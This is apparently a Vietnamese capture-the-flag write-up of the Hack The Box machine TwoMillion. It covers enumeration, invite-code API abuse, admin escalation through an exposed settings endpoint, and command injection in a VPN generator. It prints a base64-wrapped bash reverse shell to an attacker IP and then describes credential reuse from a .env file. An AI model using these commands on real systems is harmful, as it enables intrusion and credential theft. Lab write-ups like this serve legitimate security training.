# TwoMillion

<img width="1239" height="796" alt="image" src="https://github.com/user-attachments/assets/f4e96857-80d2-401e-9bba-5aedb91a69ba" />

Sau khi tôi scan port bằng `nmap -sV -T5 -p- 10.10.11.221` thì ra được 2 port gồm 80 và 22, trong đó 80 là http và 20 là ssh:

<img width="978" height="539" alt="image" src="https://github.com/user-attachments/assets/f99f0cb5-fcdd-4a01-a853-735b3a3e5e64" />

Sau khi truy cập thông qua trình duyệt thì điều hướng tới `http://2million.htb/`, cái này thì phải gắn thêm và `/etc/hosts` rồi mới vào tiếp:

<img width="421" height="172" alt="image" src="https://github.com/user-attachments/assets/cdda5581-b045-492c-a77d-1aaa8a299d28" />

<img width="1012" height="988" alt="image" src="https://github.com/user-attachments/assets/3a4e5df1-b5a8-4a21-ae7d-2ec67611f7da" />

Tôi có fuzz qua nhưng không có vẻ kết quả gì hữu ích hết:
```
ffuf -u "http://2million.htb/FUZZ" -w namdt_wordlist_1.txt -fc 401,403,404 | grep -v "Size: 162, Words: 5, Lines: 8"
```

<img width="1283" height="782" alt="image" src="https://github.com/user-attachments/assets/2c38d8a9-a9ea-4abb-9ad8-cc4b967a2616" />

Tiếp đó tôi dùng gospider để xem có gì hữu ích không và có cái `/invite` là đáng chú ý
```
gospider -s "http://2million.htb/" -o output -c 10 -d 1
```
<img width="1056" height="960" alt="image" src="https://github.com/user-attachments/assets/3b4860b9-c676-4d85-837f-56b92b29c6da" />

Ở đây thì yêu cầu nhập invite code vào, mà tôi chả biết cái invite code ở đâu nên đi đọc qua src ở f12

<img width="997" height="554" alt="image" src="https://github.com/user-attachments/assets/86ba3f80-5f43-4a7b-8c0b-ca1fd4855441" />

Trong đó thì có file js 

<img width="1261" height="937" alt="image" src="https://github.com/user-attachments/assets/5927b06c-59cd-4396-8bc5-b19369fbda26" />

Và tôi đã nhờ chatgpt làm sạch đoạn code cho dễ đọc hơn:

<img width="752" height="810" alt="image" src="https://github.com/user-attachments/assets/b52ccca9-d3df-4411-9762-e6ee9d640c45" />

Có thể thấy 2 cái endpoint là `/api/v1/invite/verify` và `/api/v1/invite/how/to/generate` trong đó cái `/api/v1/invite/verify` là để check rồi, còn cái `/api/v1/invite/how/to/generate` trông có vẻ rất là hay ho nên tôi vào thử:

Và trả lại data được encode bằng ROT13 

<img width="1600" height="591" alt="image" src="https://github.com/user-attachments/assets/41199352-d4ed-4509-876e-c8076562bfd5" />

Và đã tìm thêm được cái api nữa:

<img width="1408" height="600" alt="image" src="https://github.com/user-attachments/assets/c49268bc-ccba-4e8e-8ef7-2939b587d3bc" />

TIếp tục vào `/api/v1/invite/generate` thì được 1 đoạn data được encode base64

<img width="1433" height="512" alt="image" src="https://github.com/user-attachments/assets/30fd1d66-95ae-4d0d-80ab-18d9cc0799f3" />

<img width="986" height="634" alt="image" src="https://github.com/user-attachments/assets/fb0cdbc3-0cba-4f16-9142-d7c4229f46bb" />

Nhìn cái `NJBD5-HARN9-S2TK0-NX3VC` có vẻ giống với invite code, sau khi nhập vào thì được đưa đến trang đăng kí:

<img width="1012" height="988" alt="image" src="https://github.com/user-attachments/assets/98125256-0f5a-4da1-b26f-e54adb809828" />

Sau khi đăng nhập thì đây là giao diện trang chủ:

<img width="1464" height="972" alt="image" src="https://github.com/user-attachments/assets/db35a532-6795-422e-8324-43ed81f0bb27" />

Tiếp tục với gospider để tìm endpoint
```
gospider -s "http://2million.htb/home/rules" -o output -c 10 -d 1 --other-source -H "Accept: */*" -H "Test: test" --cookie "PHPSESSID=qd5tg5veur1q1k34e0o0n2u1ho"
```
<img width="1700" height="829" alt="image" src="https://github.com/user-attachments/assets/95d9107d-9390-4359-a332-c463470818c2" />

Cơ mà cũng không có gì đặc biệt lắm, trong url `http://2million.htb/home/access` thì có `Connection pack` và `Regenerate`, bấm vào thì nó tải về file .ovpn 

<img width="1097" height="656" alt="image" src="https://github.com/user-attachments/assets/9b132115-7de6-45a6-9b0e-0d8f97cf7aa2" />

2 cái là `/api/v1/user/vpn/generate` và `/api/v1/user/vpn/regenerate`:

<img width="1583" height="52" alt="image" src="https://github.com/user-attachments/assets/317c0181-850d-411d-bb66-d9757d9c0eba" />

Sau 1 lúc tìm thì vẫn không thấy có gì thêm, tôi thử vào `/api/v1` thì ra được 1 đống api khác:

<img width="1619" height="732" alt="image" src="https://github.com/user-attachments/assets/0a8c2b19-0a26-4f3c-b750-bbf7925fc7ea" />

Thử từng cái thì thấy user hiện tại của tôi có `"is_admin":0` tức là chưa có quyền admin

<img width="1275" height="410" alt="image" src="https://github.com/user-attachments/assets/ef4645c0-306a-40c2-9a05-074e43620fd4" />

Tôi thử chỉnh sửa lên admin thông qua `/api/v1/admin/settings/update` 

<img width="1258" height="528" alt="image" src="https://github.com/user-attachments/assets/382fc57c-bfac-4a3c-a90b-c5e9cec135f7" />

Và đã có thể lên được admin 

<img width="1357" height="453" alt="image" src="https://github.com/user-attachments/assets/c677190e-d113-4095-839d-cba9ff0c4467" />

Đối với `/api/v1/admin/vpn/generate` thì cần nhập vào username để chạy

<img width="1600" height="683" alt="image" src="https://github.com/user-attachments/assets/229d862b-d9e4-4ffa-9629-f2875f9e261a" />

Do có thể biến đổi theo bất kì tên nào tôi nhập vào nên tôi nghĩ có thể là dùng command để tạo ra mấy cái file .ovpn đó, tôi thử thêm lệnh vào xem nó như nào và xuất hiện cmdi:

<img width="1443" height="605" alt="image" src="https://github.com/user-attachments/assets/a497b9e8-eee7-4347-b1fb-41d8da4988a1" />

Tôi làm cái reverse shell để vào server xem:
```
echo -n 'bash  -i >& /dev/tcp/10.10.14.11/1234 0>&1' | base64 -w 0;echo
echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTEvMTIzNCAwPiYx | base64 -d | bash
```
<img width="1619" height="749" alt="image" src="https://github.com/user-attachments/assets/407681fd-b1eb-4194-8865-6b7861ba0063" />

Trong quá trình tìm thì tôi thấy file `.env` và trong đó chứa tài khoản mật khẩu của database

<img width="606" height="545" alt="image" src="https://github.com/user-attachments/assets/6ba5247b-ce61-4402-9030-30551dd6d66c" />

Tôi đã thử kết nối vào thì thấy có 3 tài khoản, mật khẩu bị hash, tôi dùng hashcat với wordlist rockyou.txt nhưng không ra nên bỏ đấy

Tiếp theo thì tôi thử ssh vào bằng username và mật khẩu đó xem như nào và có thể kết nối vào được:

<img width="838" height="865" alt="image" src="https://github.com/user-attachments/assets/4edf5f1d-cf07-4666-a00d-d01620e828f7" />

Ở đây còn có nhắc nhở là có mail gửi đến, tôi check mail ở `/var/mail/admin` thì có 1 đoạn mail:

<img width="846" height="407" alt="image" src="https://github.com/user-attachments/assets/7543d6cf-b62c-499f-b475-b49d4a9efa70" />

Ở đây có nhắc nhở về việc update vì phiên bản này có lỗi, tôi thử search google và ra được [CVE-2023-0386](https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/)

<img width="1419" height="491" alt="image" src="https://github.com/user-attachments/assets/a548f14e-1fdd-4d92-a32f-1f6bc7d208be" />










